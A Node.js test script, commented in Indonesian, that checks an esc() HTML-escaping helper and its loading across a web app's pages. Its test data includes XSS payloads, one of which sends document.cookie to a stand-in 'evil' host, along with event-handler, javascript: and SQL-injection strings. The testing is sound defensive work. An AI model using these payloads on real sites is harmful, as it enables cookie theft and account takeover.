// B9 — Verifikasi RUNTIME escaping XSS.
//
// `tools/audit_xss.py` hanya membaca sumber. Alat ini MEMBUKTIKAN bahwa
// esc() benar-benar menetralkan muatan berbahaya, dan bahwa helper-nya
// terpasang di ketiga berkas pemakai.
//
// Yang diuji:
//   1. esc() menetralkan 5 karakter berbahaya.
//   2. Muatan XSS nyata (tag, atribut, event handler, javascript:) tidak
//      lagi mengandung kurung sudut atau tanda kutip yang bisa lari dari
//      konteks HTML.
//   3. esc() idempoten? TIDAK — dan itu wajar (mencegah double-escape
//      yang merusak tampilan). Diuji bahwa esc(esc(x)) != esc(x) supaya
//      tidak ada yang menambahkan esc() berlapis.
//   4. Nilai null/undefined jadi '' (bukan "null"/"undefined").
//   5. Berkas escape.js di-load oleh index.html, dashboard.html, pay.html.
//   6. Setiap berkas pemakai benar-benar memanggil esc().
//
// Cara pakai:  node tools/verify_b9.mjs
import { readFileSync, existsSync } from 'node:fs';
import { createRequire } from 'node:module';
import vm from 'node:vm';

const require = createRequire(import.meta.url);

let pass = 0, fail = 0;
function check(name, cond, detail = '') {
  if (cond) { pass++; console.log(`  ✓ ${name}`); }
  else { fail++; console.log(`  ✗ ${name}${detail ? '  -> ' + detail : ''}`); }
}

// --- Muat esc() dari public/assets/escape.js -------------------------------
const src = readFileSync('public/assets/escape.js', 'utf8');
const sandbox = { module: { exports: {} } };
sandbox.globalThis = sandbox;
vm.createContext(sandbox);
vm.runInContext(src, sandbox);
const esc = sandbox.esc || sandbox.module.exports.esc;

console.log('\n[1] Unit esc()');
check('esc() terdefinisi', typeof esc === 'function');
check("esc('<') -> &lt;", esc('<') === '&lt;', esc('<'));
check("esc('>') -> &gt;", esc('>') === '&gt;', esc('>'));
check("esc('&') -> &amp;", esc('&') === '&amp;', esc('&'));
check('esc(\'"\') -> &quot;', esc('"') === '&quot;', esc('"'));
check("esc(\"'\") -> &#39;", esc("'") === '&#39;', esc("'"));

console.log('\n[2] Muatan XSS nyata');
const payloads = [
  '<img src=x onerror="alert(1)">',
  '<script>fetch("https://evil/"+document.cookie)</script>',
  '"><svg/onload=alert(1)>',
  "javascript:alert('xss')",
  '<iframe src="javascript:alert(1)"></iframe>',
  "Adi' OR '1'='1",
];
for (const p of payloads) {
  const out = esc(p);
  const nets = !out.includes('<') && !out.includes('>')
    && !out.includes('"') && !out.includes("'");
  check(`netral: ${p.slice(0, 42)}`, nets, out);
}

console.log('\n[3] Perilaku batas');
check('esc(null) -> ""', esc(null) === '');
check('esc(undefined) -> ""', esc(undefined) === '');
check('esc(0) -> "0" (bukan "")', esc(0) === '0', esc(0));
check('esc(false) -> "false"', esc(false) === 'false', esc(false));
check('esc(12.5) -> "12.5"', esc(12.5) === '12.5');
check('teks normal tidak berubah', esc('Cuci Kering') === 'Cuci Kering');
// Kalau esc() dijalankan dua kali, & jadi &amp;amp; -> tampilan rusak.
// Jadi esc() TIDAK boleh idempoten; ini mencegah esc() berlapis.
check('esc() tidak idempoten (cegah double-escape)',
  esc(esc('<b>')) !== esc('<b>'), esc(esc('<b>')));

console.log('\n[4] Terpasang di berkas pemakai');
const consumers = {
  'public/index.html': 'public/assets/escape.js',
  'public/dashboard.html': 'public/assets/escape.js',
  'public/pay.html': 'public/assets/escape.js',
};
for (const [file, dep] of Object.entries(consumers)) {
  const body = existsSync(file) ? readFileSync(file, 'utf8') : '';
  check(`${file} memuat ${dep}`,
    body.includes(dep));
}
// Catatan: dashboard.html hanyalah cangkang — ia tidak merender data
// sendiri. Penyuntikan datanya ada di app.js, jadi yang wajib memanggil
// esc() adalah app.js (diuji di bawah). Menuntut esc() di dalam
// dashboard.html akan selalu gagal dan tidak bermakna.

// app.js tidak memuat sendiri — dashboard.html yang memuatnya.
const dash = readFileSync('public/dashboard.html', 'utf8');
const appJs = readFileSync('public/app.js', 'utf8');
check('app.js memanggil esc(', /\besc\(/.test(appJs));
check('dashboard.html memuat escape.js SEBELUM app.js',
  dash.indexOf('escape.js') !== -1 &&
  dash.indexOf('escape.js') < dash.indexOf('/app.js'),
  'urutan skrip salah — esc() belum ada saat app.js jalan');

console.log('\n[5] Tidak ada lagi interpolasi mentah yang diketahui');
// Pola yang dulu jadi sumber XSS: ${o.customer_name}, ${cust.full_name}, dst.
const rawPatterns = [
  /\$\{o\.customer_name\}/,
  /\$\{o\.service_name\}/,
  /\$\{o\.order_code\}/,
  /\$\{cust\.full_name\}/,
  /\$\{t\.customer_name\}/,
  /\$\{s\.name\}/,
  /\$\{u\.full_name/,
  /\$\{data\.user\.user_name/,
];
for (const re of rawPatterns) {
  const hit = re.test(appJs) || re.test(readFileSync('public/index.html', 'utf8'))
    || re.test(readFileSync('public/pay.html', 'utf8'));
  check(`tiada ${re.source} tanpa esc`, !hit);
}

console.log(`\n${'='.repeat(52)}`);
console.log(`HASIL: ${fail === 0 ? 'HIJAU' : 'MERAH'} — ${pass} lulus, ${fail} gagal`);
console.log('='.repeat(52));
process.exit(fail === 0 ? 0 : 1);
